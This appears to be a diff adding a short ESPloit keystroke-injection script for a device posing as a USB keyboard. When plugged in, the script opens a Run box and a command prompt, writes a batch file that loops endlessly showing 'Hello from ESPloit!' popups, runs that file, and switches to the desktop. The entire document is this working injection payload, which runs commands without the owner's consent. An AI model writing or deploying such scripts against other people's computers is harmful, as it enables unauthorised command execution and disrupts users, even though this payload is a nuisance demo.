@@ -1,0 +1,10 @@
+Delay
+Delay
+Delay
+Press:131+114
+PrintLine:cmd
+PrintLine:echo :start>>payload.bat
+PrintLine:echo msg * Hello from ESPloit!>>payload.bat
+PrintLine:echo goto start>>payload.bat
+PrintLine:payload.bat
+Press:131+100
